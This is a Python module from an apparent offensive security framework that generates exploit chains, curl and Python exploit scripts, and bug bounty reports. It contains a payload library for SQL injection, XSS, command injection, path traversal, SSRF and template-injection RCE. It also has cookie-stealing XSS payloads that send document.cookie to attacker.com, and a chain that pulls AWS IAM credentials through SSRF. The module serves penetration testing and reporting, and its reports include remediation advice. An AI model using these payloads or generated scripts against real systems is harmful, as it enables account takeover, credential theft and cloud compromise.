"""
ReconX PoC Chain Engine

Transforms theoretical vulnerability chains into actionable Proof-of-Concept exploits.
Generates working code, step-by-step reproduction guides, and bug bounty-ready reports.

This module bridges the gap between:
- Detection (correlation_engine.py finds patterns)
- Exploitation (this module proves they work)

Key Features:
1. Chain Validation - Tests if source→target chains are actually exploitable
2. PoC Generation - Creates working curl/Python/requests code
3. Attack Narratives - Step-by-step reproduction with screenshots guidance
4. External Tool Integration - Leverages sqlmap, nuclei patterns
5. Report Generation - Bug bounty-ready markdown/HTML output

Architecture inspired by:
- sqlmap's exploitation engine
- Nuclei's workflow system
- Burp Suite's scan issue reporting
- HackerOne report templates

Author: ReconX Framework
Version: 1.0
"""

import hashlib
import html
import json
import re
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum, auto
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote, urlparse

# Import correlation engine types
try:
    from .correlation_engine import (
        AttackChain,  # noqa: F401
        CorrelatedEvent,  # noqa: F401
        CyberKillChainPhase,  # noqa: F401
        EventCorrelationEngine,  # noqa: F401
        VulnerabilityChainPattern,  # noqa: F401
    )
except ImportError:
    from correlation_engine import (
        AttackChain,
        CorrelatedEvent,
        EventCorrelationEngine,
    )


# =============================================================================
# POC TYPES AND TEMPLATES
# =============================================================================

class PoCLanguage(Enum):
    """Supported PoC output languages"""
    CURL = "curl"
    PYTHON = "python"
    JAVASCRIPT = "javascript"
    BURP = "burp"
    NUCLEI = "nuclei"
    RAW_HTTP = "raw_http"


class ExploitationType(Enum):
    """Types of exploitation techniques"""
    AUTH_BYPASS = auto()
    DATA_EXTRACTION = auto()
    RCE = auto()
    PRIVILEGE_ESCALATION = auto()
    SESSION_HIJACK = auto()
    SSRF_PIVOT = auto()
    FILE_READ = auto()
    FILE_WRITE = auto()
    INFO_DISCLOSURE = auto()
    ACCOUNT_TAKEOVER = auto()


@dataclass
class PoCStep:
    """A single step in a PoC chain"""
    step_number: int
    title: str
    description: str

    # Request details
    method: str = "GET"
    url: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    body: Optional[str] = None
    cookies: Dict[str, str] = field(default_factory=dict)

    # Expected response
    expected_status: List[int] = field(default_factory=lambda: [200])
    success_indicators: List[str] = field(default_factory=list)
    failure_indicators: List[str] = field(default_factory=list)

    # Extraction (for chaining)
    extract_from_response: Dict[str, str] = field(default_factory=dict)  # name -> regex

    # Generated code
    curl_command: str = ""
    python_code: str = ""
    raw_http: str = ""

    # Validation results
    validated: bool = False
    validation_response: Optional[str] = None
    validation_status: Optional[int] = None


@dataclass
class PoCChain:
    """Complete PoC chain with all steps and generated code"""
    id: str
    name: str
    description: str
    target: str

    # Classification
    vulnerability_types: List[str] = field(default_factory=list)
    exploitation_type: Optional[ExploitationType] = None
    cwe_ids: List[str] = field(default_factory=list)
    cvss_score: float = 0.0

    # Steps
    steps: List[PoCStep] = field(default_factory=list)

    # Impact
    impact_summary: str = ""
    business_impact: str = ""
    affected_users: str = "All authenticated users"

    # Metadata
    created_at: datetime = field(default_factory=datetime.now)
    validated: bool = False
    validation_time: Optional[float] = None

    # Generated artifacts
    full_python_script: str = ""
    full_curl_script: str = ""
    nuclei_template: str = ""
    markdown_report: str = ""


# =============================================================================
# PAYLOAD LIBRARIES
# =============================================================================

class PayloadLibrary:
    """
    Curated payload library for PoC generation.
    Based on PayloadsAllTheThings and real-world bug bounty reports.
    """

    # SQLi Auth Bypass payloads
    SQLI_AUTH_BYPASS = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin'--",
        "admin'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "'-'",
        "' '",
        "'&'",
        "'^'",
        "'*'",
        "' OR ''='",
        "' OR 1=1 LIMIT 1--",
        "admin' AND '1'='1",
    ]

    # SQLi Data Extraction
    SQLI_UNION = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    ]

    # SQLi Time-based
    SQLI_TIME = [
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ]

    # XSS Payloads
    XSS_BASIC = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
    ]

    XSS_FILTER_BYPASS = [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<img src=x onerror='alert(1)'>",
        "<svg/onload=alert(1)>",
        "<<script>alert(1)//<</script>",
        "<img src=x onerror=alert`1`>",
        "<details open ontoggle=alert(1)>",
    ]

    XSS_SESSION_STEAL = [
        "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
        "<img src=x onerror=\"fetch('https://attacker.com/?c='+document.cookie)\">",
        "<script>new Image().src='https://attacker.com/?c='+document.cookie</script>",
    ]

    # SSRF Payloads
    SSRF_INTERNAL = [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
    ]

    SSRF_CLOUD_METADATA = [
        "http://169.254.169.254/latest/meta-data/",  # AWS
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    ]

    # Command Injection
    CMDI_BASIC = [
        "; id",
        "| id",
        "|| id",
        "& id",
        "&& id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
    ]

    CMDI_BLIND = [
        "; sleep 5",
        "| sleep 5",
        "& sleep 5",
        "; ping -c 5 127.0.0.1",
        "| ping -c 5 127.0.0.1",
    ]

    # Path Traversal
    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd",
        r"....\/.../\....\/etc/passwd",
    ]

    # SSTI Payloads
    SSTI_DETECTION = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "@(7*7)",
        "{{config}}",
        "{{self}}",
    ]

    SSTI_RCE = {
        'jinja2': "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        'twig': "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        'freemarker': '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    }


# =============================================================================
# POC GENERATORS
# =============================================================================

class PoCGenerator:
    """Generates PoC code in multiple languages"""

    @staticmethod
    def generate_curl(step: PoCStep) -> str:
        """Generate curl command for a PoC step"""
        parts = ["curl"]

        # Method
        if step.method != "GET":
            parts.append(f"-X {step.method}")

        # Headers
        for name, value in step.headers.items():
            parts.append(f"-H '{name}: {value}'")

        # Cookies
        if step.cookies:
            cookie_str = "; ".join(f"{k}={v}" for k, v in step.cookies.items())
            parts.append(f"-b '{cookie_str}'")

        # Body
        if step.body:
            if step.headers.get('Content-Type', '').startswith('application/json'):
                parts.append(f"-d '{step.body}'")
            else:
                parts.append(f"--data '{step.body}'")

        # Follow redirects
        parts.append("-L")

        # Verbose for debugging
        parts.append("-v")

        # URL (must be last)
        parts.append(f"'{step.url}'")

        return " \\\n  ".join(parts)

    @staticmethod
    def generate_python(step: PoCStep, session_var: str = "session") -> str:
        """Generate Python requests code for a PoC step"""
        lines = []

        # Build request kwargs
        kwargs = []

        if step.headers:
            headers_str = json.dumps(step.headers, indent=8)
            kwargs.append(f"headers={headers_str}")

        if step.cookies:
            cookies_str = json.dumps(step.cookies, indent=8)
            kwargs.append(f"cookies={cookies_str}")

        if step.body:
            if step.headers.get('Content-Type', '').startswith('application/json'):
                kwargs.append(f"json={step.body}")
            else:
                kwargs.append(f"data='{step.body}'")

        kwargs.append("allow_redirects=True")

        # Build request call
        kwargs_str = ",\n        ".join(kwargs)

        lines.append(f"# Step {step.step_number}: {step.title}")
        lines.append(f"response = {session_var}.{step.method.lower()}(")
        lines.append(f"    '{step.url}',")
        if kwargs_str:
            lines.append(f"    {kwargs_str}")
        lines.append(")")
        lines.append("")

        # Add assertions
        if step.expected_status:
            status_check = " or ".join(f"response.status_code == {s}" for s in step.expected_status)
            lines.append(f"assert {status_check}, f'Unexpected status: {{response.status_code}}'")

        if step.success_indicators:
            for indicator in step.success_indicators:
                lines.append(f"assert '{indicator}' in response.text, 'Success indicator not found: {indicator}'")

        lines.append(f"print(f'[+] Step {step.step_number} succeeded: {step.title}')")
        lines.append("")

        # Add extraction
        if step.extract_from_response:
            lines.append("# Extract data for next step")
            for var_name, pattern in step.extract_from_response.items():
                lines.append("import re")
                lines.append(f"match = re.search(r'{pattern}', response.text)")
                lines.append(f"{var_name} = match.group(1) if match else None")
                lines.append(f"print(f'[*] Extracted {var_name}: {{{var_name}}}')")
            lines.append("")

        return "\n".join(lines)

    @staticmethod
    def generate_raw_http(step: PoCStep) -> str:
        """Generate raw HTTP request"""
        parsed = urlparse(step.url)
        path = parsed.path or "/"
        if parsed.query:
            path += f"?{parsed.query}"

        lines = [f"{step.method} {path} HTTP/1.1"]
        lines.append(f"Host: {parsed.netloc}")

        for name, value in step.headers.items():
            lines.append(f"{name}: {value}")

        if step.cookies:
            cookie_str = "; ".join(f"{k}={v}" for k, v in step.cookies.items())
            lines.append(f"Cookie: {cookie_str}")

        if step.body:
            lines.append(f"Content-Length: {len(step.body)}")
            lines.append("")
            lines.append(step.body)
        else:
            lines.append("")

        return "\r\n".join(lines)

    @staticmethod
    def generate_nuclei_template(chain: 'PoCChain') -> str:
        """Generate Nuclei YAML template for the chain"""
        template = {
            'id': chain.id.replace(' ', '-').lower(),
            'info': {
                'name': chain.name,
                'author': 'reconx',
                'severity': 'critical' if chain.cvss_score >= 9 else 'high' if chain.cvss_score >= 7 else 'medium',
                'description': chain.description,
                'tags': ','.join(chain.vulnerability_types),
            },
            'requests': []
        }

        for step in chain.steps:
            req = {
                'method': step.method,
                'path': [urlparse(step.url).path or '/'],
            }

            if step.headers:
                req['headers'] = step.headers

            if step.body:
                req['body'] = step.body

            matchers = []
            if step.expected_status:
                matchers.append({
                    'type': 'status',
                    'status': step.expected_status
                })

            if step.success_indicators:
                matchers.append({
                    'type': 'word',
                    'words': step.success_indicators
                })

            if matchers:
                req['matchers'] = matchers

            template['requests'].append(req)

        # Convert to YAML-like string (simplified)
        lines = [
            f"id: {template['id']}",
            "",
            "info:",
            f"  name: {template['info']['name']}",
            f"  author: {template['info']['author']}",
            f"  severity: {template['info']['severity']}",
            f"  description: {template['info']['description']}",
            f"  tags: {template['info']['tags']}",
            "",
            "requests:"
        ]

        for i, req in enumerate(template['requests']):
            lines.append(f"  - method: {req['method']}")
            lines.append("    path:")
            for p in req['path']:
                lines.append(f"      - '{p}'")

            if 'headers' in req:
                lines.append("    headers:")
                for k, v in req['headers'].items():
                    lines.append(f"      {k}: '{v}'")

            if 'body' in req:
                lines.append(f"    body: '{req['body']}'")

            if 'matchers' in req:
                lines.append("    matchers:")
                for m in req['matchers']:
                    lines.append(f"      - type: {m['type']}")
                    if 'status' in m:
                        lines.append("        status:")
                        for s in m['status']:
                            lines.append(f"          - {s}")
                    if 'words' in m:
                        lines.append("        words:")
                        for w in m['words']:
                            lines.append(f"          - '{w}'")

            lines.append("")

        return "\n".join(lines)


# =============================================================================
# CHAIN BUILDERS
# =============================================================================

class ChainBuilder:
    """Builds PoC chains for specific vulnerability patterns"""

    @staticmethod
    def build_sqli_auth_bypass_chain(
        target_url: str,
        login_endpoint: str,
        username_param: str = "uid",
        password_param: str = "passw",
        authenticated_page: str = "/bank/main.jsp"
    ) -> PoCChain:
        """Build SQLi authentication bypass PoC chain"""

        # Create unique ID from full URL path
        full_url = f"{target_url.rstrip('/')}{login_endpoint}"
        chain_id = f"sqli-auth-bypass-{hashlib.sha256(full_url.encode()).hexdigest()[:8]}"

        # Create descriptive name with endpoint
        short_endpoint = login_endpoint.split('/')[-1] or login_endpoint[:30]
        chain_name = f"SQLi Auth Bypass ({short_endpoint})"

        chain = PoCChain(
            id=chain_id,
            name=chain_name,
            description=f"SQL injection at {login_endpoint} allows bypassing authentication without valid credentials",
            target=target_url,
            vulnerability_types=["sql_injection", "authentication_bypass"],
            exploitation_type=ExploitationType.AUTH_BYPASS,
            cwe_ids=["CWE-89", "CWE-287"],
            cvss_score=9.8,
            impact_summary="Complete authentication bypass - attacker gains access as any user",
            business_impact="Full account takeover, unauthorized access to all user data and functionality",
        )

        # Step 1: SQLi Auth Bypass
        step1 = PoCStep(
            step_number=1,
            title="SQL Injection Authentication Bypass",
            description="Inject SQL payload to bypass login authentication",
            method="POST",
            url=f"{target_url.rstrip('/')}{login_endpoint}",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            body=f"{username_param}=admin'--&{password_param}=x",
            expected_status=[302, 200],
            success_indicators=["main.jsp", "Welcome", "Account", "Dashboard"],
            failure_indicators=["Invalid", "incorrect", "failed", "error"],
            extract_from_response={
                "session_cookie": r"JSESSIONID=([^;]+)"
            }
        )

        # Generate code for step 1
        step1.curl_command = PoCGenerator.generate_curl(step1)
        step1.python_code = PoCGenerator.generate_python(step1)
        step1.raw_http = PoCGenerator.generate_raw_http(step1)

        chain.steps.append(step1)

        # Step 2: Access authenticated area
        step2 = PoCStep(
            step_number=2,
            title="Access Protected Resource",
            description="Access authenticated area using bypassed session",
            method="GET",
            url=f"{target_url.rstrip('/')}{authenticated_page}",
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            expected_status=[200],
            success_indicators=["Account", "Balance", "Welcome", "Admin"],
            failure_indicators=["login", "unauthorized", "denied"],
        )

        step2.curl_command = PoCGenerator.generate_curl(step2)
        step2.python_code = PoCGenerator.generate_python(step2)
        step2.raw_http = PoCGenerator.generate_raw_http(step2)

        chain.steps.append(step2)

        # Generate full scripts
        chain.full_python_script = ChainBuilder._generate_full_python_script(chain)
        chain.full_curl_script = ChainBuilder._generate_full_curl_script(chain)
        chain.nuclei_template = PoCGenerator.generate_nuclei_template(chain)
        chain.markdown_report = ChainBuilder._generate_markdown_report(chain)

        return chain

    @staticmethod
    def build_sqli_data_extraction_chain(
        target_url: str,
        vulnerable_endpoint: str,
        vulnerable_param: str = "query"
    ) -> PoCChain:
        """Build SQLi data extraction PoC chain"""

        # Create unique ID from full URL path
        full_url = f"{target_url.rstrip('/')}{vulnerable_endpoint}"
        chain_id = f"sqli-data-extract-{hashlib.sha256(full_url.encode()).hexdigest()[:8]}"

        # Create descriptive name with endpoint
        short_endpoint = vulnerable_endpoint.split('/')[-1] or vulnerable_endpoint[:30]
        chain_name = f"SQLi Data Extraction ({short_endpoint})"

        chain = PoCChain(
            id=chain_id,
            name=chain_name,
            description=f"SQL injection at {vulnerable_endpoint} allows extraction of sensitive database contents",
            target=target_url,
            vulnerability_types=["sql_injection", "data_breach"],
            exploitation_type=ExploitationType.DATA_EXTRACTION,
            cwe_ids=["CWE-89", "CWE-200"],
            cvss_score=9.1,
            impact_summary="Unauthorized access to entire database contents",
            business_impact="Data breach - exposure of user credentials, PII, financial data",
        )

        # Step 1: Confirm SQLi
        step1 = PoCStep(
            step_number=1,
            title="Confirm SQL Injection",
            description="Verify the endpoint is vulnerable to SQL injection",
            method="GET",
            url=f"{target_url.rstrip('/')}{vulnerable_endpoint}?{vulnerable_param}=" + quote("' OR '1'='1"),
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            expected_status=[200],
            success_indicators=["results", "found", "data"],
        )
        step1.curl_command = PoCGenerator.generate_curl(step1)
        step1.python_code = PoCGenerator.generate_python(step1)
        chain.steps.append(step1)

        # Step 2: Enumerate columns
        step2 = PoCStep(
            step_number=2,
            title="Enumerate Database Structure",
            description="Determine number of columns using ORDER BY",
            method="GET",
            url=f"{target_url.rstrip('/')}{vulnerable_endpoint}?{vulnerable_param}=" + quote("' ORDER BY 1--"),
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            expected_status=[200],
        )
        step2.curl_command = PoCGenerator.generate_curl(step2)
        step2.python_code = PoCGenerator.generate_python(step2)
        chain.steps.append(step2)

        # Step 3: Extract data with UNION
        step3 = PoCStep(
            step_number=3,
            title="Extract Sensitive Data",
            description="Use UNION-based injection to extract data",
            method="GET",
            url=f"{target_url.rstrip('/')}{vulnerable_endpoint}?{vulnerable_param}=" + quote("' UNION SELECT username,password FROM users--"),
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            expected_status=[200],
        )
        step3.curl_command = PoCGenerator.generate_curl(step3)
        step3.python_code = PoCGenerator.generate_python(step3)
        chain.steps.append(step3)

        chain.full_python_script = ChainBuilder._generate_full_python_script(chain)
        chain.full_curl_script = ChainBuilder._generate_full_curl_script(chain)
        chain.markdown_report = ChainBuilder._generate_markdown_report(chain)

        return chain

    @staticmethod
    def build_xss_session_hijack_chain(
        target_url: str,
        vulnerable_endpoint: str,
        vulnerable_param: str = "q"
    ) -> PoCChain:
        """Build XSS to session hijacking PoC chain"""

        # Create unique ID from full URL path
        full_url = f"{target_url.rstrip('/')}{vulnerable_endpoint}"
        chain_id = f"xss-session-hijack-{hashlib.sha256(full_url.encode()).hexdigest()[:8]}"

        # Create descriptive name with endpoint
        short_endpoint = vulnerable_endpoint.split('/')[-1] or vulnerable_endpoint[:30]
        chain_name = f"XSS Session Hijack ({short_endpoint})"

        chain = PoCChain(
            id=chain_id,
            name=chain_name,
            description=f"Reflected XSS at {vulnerable_endpoint} enables session cookie theft and account takeover",
            target=target_url,
            vulnerability_types=["xss", "session_hijacking"],
            exploitation_type=ExploitationType.SESSION_HIJACK,
            cwe_ids=["CWE-79", "CWE-384"],
            cvss_score=8.1,
            impact_summary="Session token theft via malicious JavaScript",
            business_impact="Account takeover - attacker can impersonate any user who triggers the XSS",
        )

        # Step 1: Inject XSS
        payload = "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"

        step1 = PoCStep(
            step_number=1,
            title="Inject XSS Payload",
            description="Inject session-stealing XSS payload",
            method="GET",
            url=f"{target_url.rstrip('/')}{vulnerable_endpoint}?{vulnerable_param}={quote(payload)}",
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            expected_status=[200],
            success_indicators=[payload.replace('<', '&lt;'), 'script', 'fetch'],
        )
        step1.curl_command = PoCGenerator.generate_curl(step1)
        step1.python_code = PoCGenerator.generate_python(step1)
        chain.steps.append(step1)

        chain.full_python_script = ChainBuilder._generate_full_python_script(chain)
        chain.full_curl_script = ChainBuilder._generate_full_curl_script(chain)
        chain.markdown_report = ChainBuilder._generate_markdown_report(chain)

        return chain

    @staticmethod
    def build_ssrf_cloud_metadata_chain(
        target_url: str,
        vulnerable_endpoint: str,
        vulnerable_param: str = "url"
    ) -> PoCChain:
        """Build SSRF to cloud metadata extraction chain"""

        # Create unique ID from full URL path
        full_url = f"{target_url.rstrip('/')}{vulnerable_endpoint}"
        chain_id = f"ssrf-metadata-{hashlib.sha256(full_url.encode()).hexdigest()[:8]}"

        # Create descriptive name with endpoint
        short_endpoint = vulnerable_endpoint.split('/')[-1] or vulnerable_endpoint[:30]
        chain_name = f"SSRF Cloud Metadata ({short_endpoint})"

        chain = PoCChain(
            id=chain_id,
            name=chain_name,
            description=f"SSRF at {vulnerable_endpoint} allows access to cloud instance metadata and credentials",
            target=target_url,
            vulnerability_types=["ssrf", "information_disclosure", "credential_theft"],
            exploitation_type=ExploitationType.INFO_DISCLOSURE,
            cwe_ids=["CWE-918", "CWE-200"],
            cvss_score=9.1,
            impact_summary="Access to cloud IAM credentials via metadata endpoint",
            business_impact="Full cloud account compromise - attacker can access AWS/GCP/Azure resources",
        )

        # Step 1: Confirm SSRF
        step1 = PoCStep(
            step_number=1,
            title="Confirm SSRF Vulnerability",
            description="Test internal connectivity via SSRF",
            method="GET",
            url=f"{target_url.rstrip('/')}{vulnerable_endpoint}?{vulnerable_param}=http://127.0.0.1",
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            expected_status=[200],
        )
        step1.curl_command = PoCGenerator.generate_curl(step1)
        step1.python_code = PoCGenerator.generate_python(step1)
        chain.steps.append(step1)

        # Step 2: Access AWS metadata
        step2 = PoCStep(
            step_number=2,
            title="Access AWS Metadata Endpoint",
            description="Retrieve instance metadata via SSRF",
            method="GET",
            url=f"{target_url.rstrip('/')}{vulnerable_endpoint}?{vulnerable_param}=http://169.254.169.254/latest/meta-data/",
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            expected_status=[200],
            success_indicators=["ami-id", "instance-id", "iam"],
        )
        step2.curl_command = PoCGenerator.generate_curl(step2)
        step2.python_code = PoCGenerator.generate_python(step2)
        chain.steps.append(step2)

        # Step 3: Extract IAM credentials
        step3 = PoCStep(
            step_number=3,
            title="Extract IAM Credentials",
            description="Retrieve IAM security credentials from metadata",
            method="GET",
            url=f"{target_url.rstrip('/')}{vulnerable_endpoint}?{vulnerable_param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            expected_status=[200],
            success_indicators=["AccessKeyId", "SecretAccessKey", "Token"],
            extract_from_response={
                "access_key": r'"AccessKeyId"\s*:\s*"([^"]+)"',
                "secret_key": r'"SecretAccessKey"\s*:\s*"([^"]+)"',
            }
        )
        step3.curl_command = PoCGenerator.generate_curl(step3)
        step3.python_code = PoCGenerator.generate_python(step3)
        chain.steps.append(step3)

        chain.full_python_script = ChainBuilder._generate_full_python_script(chain)
        chain.full_curl_script = ChainBuilder._generate_full_curl_script(chain)
        chain.markdown_report = ChainBuilder._generate_markdown_report(chain)

        return chain

    @staticmethod
    def _generate_full_python_script(chain: PoCChain) -> str:
        """Generate complete Python exploit script"""
        lines = [
            "#!/usr/bin/env python3",
            '"""',
            f"PoC Exploit: {chain.name}",
            f"Target: {chain.target}",
            f"Generated: {chain.created_at.isoformat()}",
            "",
            f"Description: {chain.description}",
            "",
            f"Impact: {chain.impact_summary}",
            '"""',
            "",
            "import requests",
            "import re",
            "import sys",
            "from urllib.parse import quote",
            "",
            "# Disable SSL warnings for testing",
            "import urllib3",
            "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)",
            "",
            f"TARGET = '{chain.target}'",
            "",
            "def exploit():",
            '    """Execute the exploit chain"""',
            "    session = requests.Session()",
            "    session.verify = False  # Disable SSL verification for testing",
            "",
        ]

        for step in chain.steps:
            lines.append(f"    # {'=' * 60}")
            lines.append(f"    # Step {step.step_number}: {step.title}")
            lines.append(f"    # {'=' * 60}")
            lines.append(f"    print(f'\\n[*] Step {step.step_number}: {step.title}')")
            lines.append(f"    print(f'    {step.description}')")
            lines.append("")

            # Indent the Python code
            for code_line in step.python_code.split('\n'):
                if code_line.strip():
                    lines.append(f"    {code_line}")
                else:
                    lines.append("")

            lines.append("")

        lines.extend([
            "    print('\\n' + '=' * 60)",
            "    print('[+] EXPLOIT CHAIN COMPLETED SUCCESSFULLY')",
            "    print('=' * 60)",
            "    return True",
            "",
            "if __name__ == '__main__':",
            "    try:",
            "        success = exploit()",
            "        sys.exit(0 if success else 1)",
            "    except Exception as e:",
            "        print(f'\\n[-] Exploit failed: {e}')",
            "        sys.exit(1)",
        ])

        return "\n".join(lines)

    @staticmethod
    def _generate_full_curl_script(chain: PoCChain) -> str:
        """Generate complete bash script with curl commands"""
        lines = [
            "#!/bin/bash",
            f"# PoC Exploit: {chain.name}",
            f"# Target: {chain.target}",
            f"# Generated: {chain.created_at.isoformat()}",
            "#",
            f"# Description: {chain.description}",
            f"# Impact: {chain.impact_summary}",
            "",
            "set -e  # Exit on error",
            "",
            "echo '=================================================='",
            f"echo 'PoC: {chain.name}'",
            "echo '=================================================='",
            "",
        ]

        for step in chain.steps:
            lines.append(f"# Step {step.step_number}: {step.title}")
            lines.append("echo ''")
            lines.append(f"echo '[*] Step {step.step_number}: {step.title}'")
            lines.append(f"echo '    {step.description}'")
            lines.append("echo ''")
            lines.append("")
            lines.append(step.curl_command)
            lines.append("")
            lines.append("echo ''")
            lines.append(f"echo '[+] Step {step.step_number} completed'")
            lines.append("")

        lines.extend([
            "echo ''",
            "echo '=================================================='",
            "echo '[+] EXPLOIT CHAIN COMPLETED'",
            "echo '=================================================='",
        ])

        return "\n".join(lines)

    @staticmethod
    def _generate_markdown_report(chain: PoCChain) -> str:
        """Generate bug bounty-ready markdown report"""
        lines = [
            f"# {chain.name}",
            "",
            "## Summary",
            "",
            f"**Target:** `{chain.target}`",
            "",
            f"**Severity:** {'Critical' if chain.cvss_score >= 9 else 'High' if chain.cvss_score >= 7 else 'Medium'}",
            f"**CVSS Score:** {chain.cvss_score}/10",
            "",
            f"**Vulnerability Types:** {', '.join(chain.vulnerability_types)}",
            f"**CWE IDs:** {', '.join(chain.cwe_ids)}",
            "",
            "## Description",
            "",
            chain.description,
            "",
            "## Impact",
            "",
            f"**Technical Impact:** {chain.impact_summary}",
            "",
            f"**Business Impact:** {chain.business_impact}",
            "",
            f"**Affected Users:** {chain.affected_users}",
            "",
            "## Steps to Reproduce",
            "",
        ]

        for step in chain.steps:
            lines.append(f"### Step {step.step_number}: {step.title}")
            lines.append("")
            lines.append(step.description)
            lines.append("")
            lines.append("**Request:**")
            lines.append("```http")
            lines.append(step.raw_http)
            lines.append("```")
            lines.append("")
            lines.append("**cURL Command:**")
            lines.append("```bash")
            lines.append(step.curl_command)
            lines.append("```")
            lines.append("")
            if step.success_indicators:
                lines.append(f"**Expected Result:** Response should contain: `{', '.join(step.success_indicators[:3])}`")
                lines.append("")

        lines.extend([
            "## Proof of Concept Script",
            "",
            "### Python",
            "",
            "```python",
            chain.full_python_script,
            "```",
            "",
            "### Bash (cURL)",
            "",
            "```bash",
            chain.full_curl_script,
            "```",
            "",
            "## Remediation",
            "",
        ])

        # Add specific remediation based on vulnerability types
        if "sql_injection" in chain.vulnerability_types:
            lines.extend([
                "1. **Use Parameterized Queries:** Replace string concatenation with prepared statements",
                "2. **Input Validation:** Validate and sanitize all user input",
                "3. **Least Privilege:** Database accounts should have minimal required permissions",
                "4. **WAF Rules:** Deploy web application firewall with SQLi detection rules",
                "",
            ])

        if "xss" in chain.vulnerability_types:
            lines.extend([
                "1. **Output Encoding:** Encode all user-supplied data before rendering",
                "2. **Content Security Policy:** Implement strict CSP headers",
                "3. **HttpOnly Cookies:** Set HttpOnly flag on session cookies",
                "4. **Input Validation:** Validate and sanitize all user input",
                "",
            ])

        if "ssrf" in chain.vulnerability_types:
            lines.extend([
                "1. **URL Allowlisting:** Only allow connections to approved domains",
                "2. **Block Internal IPs:** Deny requests to private IP ranges and localhost",
                "3. **Disable Redirects:** Prevent SSRF via redirect chains",
                "4. **IMDSv2:** Require IMDSv2 for cloud metadata access (AWS)",
                "",
            ])

        lines.extend([
            "## References",
            "",
            "- OWASP: https://owasp.org/",
            "- CWE: https://cwe.mitre.org/",
            "- MITRE ATT&CK: https://attack.mitre.org/",
            "",
            "---",
            f"*Report generated by ReconX PoC Chain Engine - {chain.created_at.strftime('%Y-%m-%d %H:%M:%S')}*",
        ])

        return "\n".join(lines)


# =============================================================================
# POC CHAIN ENGINE
# =============================================================================

class PoCChainEngine:
    """
    Main engine for transforming correlation findings into actionable PoC chains.

    Workflow:
    1. Receive findings from correlation engine
    2. Identify exploitable chain patterns
    3. Build PoC steps with working code
    4. Validate chains (optional, requires network access)
    5. Generate reports
    """

    def __init__(self, target: str):
        self.target = target
        self.chains: List[PoCChain] = []
        self.payload_library = PayloadLibrary()

    def process_correlation_results(
        self,
        correlation_engine: EventCorrelationEngine
    ) -> List[PoCChain]:
        """
        Process results from correlation engine and generate PoC chains.

        Deduplicates chains by URL to avoid repetitive reporting.

        Args:
            correlation_engine: Configured EventCorrelationEngine with findings

        Returns:
            List of generated PoCChains (deduplicated)
        """
        chains = []
        seen_urls = set()  # Track unique vulnerable URLs

        # Process detected attack chains first (these have multi-step logic)
        for attack_chain in correlation_engine.chains:
            poc_chain = self._convert_attack_chain(attack_chain)
            if poc_chain and poc_chain.steps:
                chain_url = poc_chain.steps[0].url
                if chain_url not in seen_urls:
                    seen_urls.add(chain_url)
                    chains.append(poc_chain)

        # Also check for individual high-value findings (deduplicated)
        for event in correlation_engine.events:
            if event.severity.lower() in ['critical', 'high']:
                # Skip if we already have a chain for this URL
                if event.url in seen_urls:
                    continue

                poc_chain = self._build_chain_from_event(event)
                if poc_chain and poc_chain.steps:
                    chain_url = poc_chain.steps[0].url
                    if chain_url not in seen_urls:
                        seen_urls.add(chain_url)
                        chains.append(poc_chain)

        self.chains = chains
        return chains

    def _convert_attack_chain(self, attack_chain: AttackChain) -> Optional[PoCChain]:
        """Convert correlation AttackChain to actionable PoCChain"""
        if not attack_chain.events:
            return None

        # Determine chain type and build appropriate PoC
        vuln_types = set()
